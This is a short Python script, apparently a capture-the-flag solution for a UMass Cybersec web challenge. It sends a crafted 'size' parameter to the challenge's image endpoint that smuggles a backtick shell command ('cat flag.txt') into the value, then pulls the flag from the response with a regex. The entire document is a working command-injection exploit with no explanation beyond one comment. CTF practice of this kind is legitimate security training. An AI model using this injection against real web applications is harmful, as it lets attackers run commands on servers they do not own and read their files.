#!/usr/bin/env python3
import requests, re

URL = 'http://spongebob-blog.ctf.umasscybersec.org/'
PAYLOAD = {'name': 'house', 'size': '300x495 |smile"`cat flag.txt`".gif'} # command injection

r = requests.get(URL + 'assets/image', params=PAYLOAD)
print(re.findall(r'UMASS\{.*\}', r.text)[0])